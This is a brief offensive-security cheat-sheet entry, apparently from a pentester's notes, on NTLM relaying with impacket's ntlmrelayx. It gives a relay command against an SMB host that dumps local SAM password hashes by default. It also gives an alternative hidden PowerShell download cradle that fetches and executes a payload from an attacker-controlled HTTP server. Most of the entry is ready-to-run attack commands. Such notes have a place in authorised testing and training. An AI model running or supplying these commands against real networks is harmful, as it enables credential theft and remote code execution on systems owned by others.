## [[NTLM Relaying]]
Run ntlmrelayx or responder.
By default (not provided -c) it will do `secretsdump` to dump the local SAM hashes
``````sh
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server

# alternatively provide a command with:
-c
'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'
``````

```meta
requirements: 
results: 
oss: #linux
source: https://github.com/SecureAuthCorp/impacket/tree/master/impacket/examples/ntlmrelayx
description: NTLM relay tool
undetected: 
```